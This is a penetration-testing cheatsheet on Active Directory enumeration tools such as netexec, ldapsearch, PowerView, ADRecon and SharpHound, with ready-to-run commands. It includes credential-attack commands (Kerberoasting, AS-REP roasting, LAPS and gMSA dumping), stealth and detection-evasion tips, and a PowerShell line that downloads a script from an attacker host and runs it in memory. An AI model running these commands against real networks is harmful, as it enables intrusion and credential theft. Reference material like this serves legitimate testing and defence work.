---
aliases:
  - netexec AD
  - PowerView
  - ADRecon
  - ldapsearch AD
  - SharpHound Collector
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Hosts Enumeration]]"
  - "[[netexec]]"
  - "[[BloodHound & SharpHound]]"
  - "[[Impacket Toolkit]]"
---
# AD - Hosts Enumeration - Tooling

***

## netexec (nxc) - Multi-Protocol Swiss Army Knife

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| SMB host discovery | `nxc smb 10.0.0.0/24` | Hostname + OS + signing. |
| Anonymous SMB enum | `nxc smb 10.0.0.0/24 -u '' -p ''` | Null check. |
| SMB shares bulk | `nxc smb hosts.txt -u u -p p --shares` | Read/Write flags. |
| SMB sessions | `nxc smb hosts.txt -u u -p p --sessions` | Active sessions. |
| Logged on users | `nxc smb hosts.txt -u u -p p --loggedon-users` | Tier discovery. |
| LDAP computers | `nxc ldap DC -u u -p p --computers` | All computers. |
| LDAP users | `nxc ldap DC -u u -p p --users` | All users. |
| LDAP groups | `nxc ldap DC -u u -p p --groups` | All groups. |
| LDAP password policy | `nxc smb DC -u u -p p --pass-pol` | Domain policy. |
| LDAP raw query | `nxc ldap DC -u u -p p --query "(filter)" "attrs"` | Custom. |
| Kerberos AS-REP | `nxc ldap DC -u u -p p --asreproastable` | Ver hub AS-REP. |
| Kerberoast | `nxc ldap DC -u u -p p --kerberoasting out.txt` | Ver hub Kerberoast. |
| Trusts | `nxc ldap DC -u u -p p --trusted-for-delegation` | Adjacent. |
| LAPS | `nxc smb hosts.txt -u u -p p --laps` | LAPS bulk read. |
| gMSA | `nxc ldap DC -u u -p p --gmsa` | gMSA dump. |
| RID brute | `nxc smb DC -u u -p p --rid-brute` | RID range. |
| Relay candidates | `nxc smb hosts --gen-relay-list relay.txt` | Relay prep. |
^ad-tool-netexec

### netexec quick recon flow

```bash
# Step 1: Discovery
nxc smb 10.0.0.0/24

# Step 2: Identify DC
DC=$(nxc smb 10.0.0.0/24 | grep -i "domain:" | head -1 | awk '{print $2}')

# Step 3: Anonymous probes
nxc smb $DC -u '' -p '' --shares
nxc ldap $DC -u '' -p '' --get-domain-info

# Step 4: After cred acquisition
nxc smb $DC -u user -p pass --pass-pol
nxc ldap $DC -u user -p pass --users > users.txt
nxc ldap $DC -u user -p pass --computers > computers.txt
```

___

## ldapsearch / Linux LDAP

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| RootDSE anonymous | `ldapsearch -x -h DC -s base namingcontexts` | Bind w/o creds. |
| Authenticated bind | `ldapsearch -h DC -D 'dom\user' -w pass -b "DC=dom,DC=local"` | Standard. |
| LDAPS (signing) | `ldapsearch -H ldaps://DC -D 'dom\user' -w pass` | Encrypted. |
| Specific filter | `... "(objectClass=user)"` | LDAP syntax. |
| Specific attributes | `... "(filter)" attr1 attr2` | Filter return fields. |
| Subtree scope | `... -s subtree -b "DC=dom,DC=local"` | Default. |
| One-level scope | `... -s onelevel -b "OU=X"` | Children only. |
| Base scope | `... -s base -b "CN=X"` | Single object. |
| Paged results | LDAP_PAGED_RESULT_OID large queries | Auto-paged. |
| Output LDIF | Default format | Standard. |
| Output text | `-t` (binary attrs) | Edge. |
| Performance | Limit attrs returned for speed | Optimize. |
| Bitwise filter | `userAccountControl:1.2.840.113556.1.4.803:=4194304` | UAC flags. |
| Recursive filter | `memberOf:1.2.840.113556.1.4.1941:=CN=...` | Nested. |
| `Authentication required` error | Anonymous blocked | Need creds. |
| `sizeLimitExceeded` | Default 1000 limit | Use paged. |
^ad-tool-ldapsearch

### ldapsearch templates

```bash
# Standard auth + base
LDAPSEARCH="ldapsearch -h DC -D 'dom\\user' -w pass -b DC=dom,DC=local"

# All users (filter UAC NORMAL_ACCOUNT)
$LDAPSEARCH "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=512))" \
  samAccountName userPrincipalName

# Servers only
$LDAPSEARCH "(&(objectCategory=computer)(operatingSystem=*Server*))" \
  cn dNSHostName operatingSystem

# AS-REP roastable
$LDAPSEARCH "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  samAccountName

# Kerberoastable (SPN bound)
$LDAPSEARCH "(&(objectCategory=user)(servicePrincipalName=*))" \
  samAccountName servicePrincipalName

# Unconstrained delegation computers
$LDAPSEARCH "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  cn dNSHostName
```

___

## PowerView / pywerview

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Get-Domain | Domain info | RSAT-free recon. |
| Get-DomainController | DC list | Adjacent. |
| Get-DomainComputer | All computers | Versatile filter. |
| Get-DomainUser | All users | Same. |
| Get-DomainGroup | All groups | Same. |
| Get-DomainOU | OU tree | Adjacent. |
| Get-DomainSite | Sites | Topology. |
| Get-DomainSubnet | Subnets | Topology. |
| Get-DomainTrust | Trusts | Direct. |
| Get-DomainTrustMapping | Multi-domain crawl | Forest map. |
| Find-LocalAdminAccess | Admin enum on hosts | Lateral. |
| Find-DomainShare | Share recon | Adjacent. |
| Find-InterestingFile | Share content recon | Targeted. |
| Find-DomainObjectAcl | ACL recon | Privesc path. |
| Find-InterestingDomainAcl | Dangerous ACEs | Direct. |
| Get-DomainGPO | GPO enum | Direct. |
| Get-DomainPolicy | Default + Domain Controller policy | Adjacent. |
| Get-NetSession | Session enum (network discovery RPC) | Often blocked modern. |
| Get-NetLoggedOn | Logged-on users | Adjacent. |
| Get-DomainSPNTicket | Kerberoast | Ver hub. |
| pywerview (Linux) | Linux port | Adjacent. |
^ad-tool-powerview

### PowerView import + recon

```powershell
# Import (in-memory if AV)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
# Or local
Import-Module .\PowerView.ps1

# Domain overview
Get-Domain
Get-DomainController -Filter * | Select Name,IPAddress,OSVersion

# Computers detail
Get-DomainComputer -Properties Name,OperatingSystem,LastLogonTimestamp,Description |
  Sort LastLogonTimestamp -Desc

# OU tree
Get-DomainOU | Select Name,DistinguishedName

# Linux equivalent — pywerview
pywerview get-netuser -u user -p pass -d dom.local --dc-ip DC
pywerview get-netcomputer -u user -p pass -d dom.local --dc-ip DC
```

___

## ADRecon / ADCollector / Bulk Reports

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| ADRecon (PowerShell) | `.\ADRecon.ps1` | XLSX comprehensive report. |
| ADRecon options | `-Method LDAP -DomainController DC` | Auth method. |
| ADRecon scope | `-Collect Forest,Domain,Trusts,Sites,Subnets,Computers,Users,Groups,OUs,GPOs,GroupPolicies,DNSZones,DNSNodes` | Selectable. |
| ADRecon output | XLSX + CSV per category | Easy to share. |
| ADCollector (.NET) | `.\ADCollector.exe` | Faster than PS. |
| pingcastle | `pingcastle.exe --healthcheck --server DC` | Health audit. |
| Purple Knight | Semperis tool | Defender + recon. |
| BloodHound (Trusts/DCOnly) | `bloodhound-python -c Trusts,DCOnly` | Quick BH-style. |
| `windapsearch` | `python windapsearch.py -u u@dom -p p --dc-ip DC -m all` | Comprehensive. |
| `LDAPDomainDump` | `ldd dom\u:p@DC` | HTML reports. |
| `ldap-monitor-shutdown` (Trimstray) | LDAP monitoring | Detection adjacent. |
| `ADModule` (Microsoft) | RSAT module bundle | Standard. |
| `dsquery` / `dsget` | Native legacy | Old but works. |
| `adfind` (Joeware) | Comprehensive command-line | Advanced. |
| `adexplorer` (Sysinternals) | GUI offline snapshot | Comprehensive. |
| `adexplorer-snapshot-parser` | Parse AD snapshots | Offline analysis. |
^ad-tool-bulk

### ADRecon comprehensive report

```powershell
# Run ADRecon
git clone https://github.com/adrecon/ADRecon.git
.\ADRecon\ADRecon.ps1 -Method LDAP -DomainController DC -Credential (Get-Credential)

# Output:
# ADRecon-Report-YYYYMMDDHHMMSS\
#   Forest.xlsx
#   Domains.xlsx
#   Trusts.xlsx
#   Sites.xlsx
#   Subnets.xlsx
#   ...
```

```bash
# Linux equivalent — windapsearch
git clone https://github.com/ropnop/windapsearch
cd windapsearch
python3 windapsearch.py -d dom.local -u user -p pass --dc DC -m all -o report.json

# LDAPDomainDump
pip install ldapdomaindump
ldd dom\\user:pass@DC -o report
```

___

## SharpHound / RustHound / AzureHound (Collectors)

| **Tool** | **Use** | **Notas** |
|:---:|:---:|:---:|
| SharpHound (.NET) | Standard BH collector | Most features. |
| SharpHound options | `-c Default` (most info) | Comprehensive. |
| SharpHound -c All | All collection | Slow but thorough. |
| SharpHound -c Trusts | Trust-only | Quick. |
| SharpHound -c DCOnly | DC-side only — stealthier | Defender-evade. |
| SharpHound -c LocalAdmin,Sessions | Lateral movement focus | Targeted. |
| RustHound (Rust) | Faster + cross-platform | Modern. |
| RustHound options | `--zip --ldapfqdn dom.local` | Standard. |
| BloodHound.py (Python) | Linux-friendly | Ver [[BloodHound & SharpHound]]. |
| AzureHound | Azure AD enumeration | Cloud variant. |
| ADExplorer + parser | Sysinternals snapshot → BH | Stealth alternative. |
| Stealth mode | Avoid detection — limited collection | Operational. |
| Loop mode (`-LoopDuration`) | Continuous session enum | Long-term. |
| Output JSON ZIP | Standard BH format | Ingest directly. |
| Output split per file | Multi-file output | Large environments. |
| Encrypted collection (4.x) | Encrypted ZIP | Modern. |
| Excluded by default: ADCS | Use BloodHoundCE / Certipy | Adjacent. |
^ad-tool-sharphound

### SharpHound collection

```powershell
# Default (recommended for full enum)
.\SharpHound.exe -c Default

# Stealth (DC-only)
.\SharpHound.exe -c DCOnly

# All (slowest but most info)
.\SharpHound.exe -c All

# Loop mode (sessions over time)
.\SharpHound.exe -c Session --LoopDuration 24h

# RustHound alternative
rusthound -d dom.local -u user@dom.local -p pass --zip
```

```bash
# Linux — BloodHound.py
bloodhound-python -d dom.local -u user -p pass -ns DC-IP -c All --zip
```

___

## Wordlists & Recursos

| **Recurso** | **URL / Path** | **Notas** |
|:---:|:---:|:---:|
| HackTricks AD Methodology | `book.hacktricks.xyz/windows-hardening/active-directory-methodology` | Reference. |
| The Hacker Recipes | `thehacker.recipes/ad/` | Comprehensive. |
| ADSecurity (Sean Metcalf) | `adsecurity.org` | Defender-side intel. |
| BloodHound docs | `bloodhound.specterops.io` | Tool docs. |
| Pentester.land cheatsheet AD | Linkedin/blog | Adjacent. |
| Orange Cyberdefense ad | `orange-cyberdefense.com/global/blog` | Real research. |
| SecLists Discovery | `Discovery/Web-Content/` | Path/host wordlists. |
| SecLists Usernames | `Usernames/` | User enum spray. |
| `xc0ffee.io` | Custom AD attacks | Adjacent. |
| MITRE ATT&CK Discovery | `attack.mitre.org/tactics/TA0007/` | Framework. |
| `awesome-active-directory` GitHub | Curated list | Foundation. |
| LDAP cheat sheets | Various | Reference. |
| Sander Steffann LDAP filter | Filter syntax reference | Direct. |
| RFC 4511 LDAP Protocol | IETF spec | Authoritative. |
| RFC 2247 LDAP DN Syntax | Spec | Edge. |
| `windapsearch` repo | `github.com/ropnop/windapsearch` | Tool. |
^ad-tool-wordlists

***
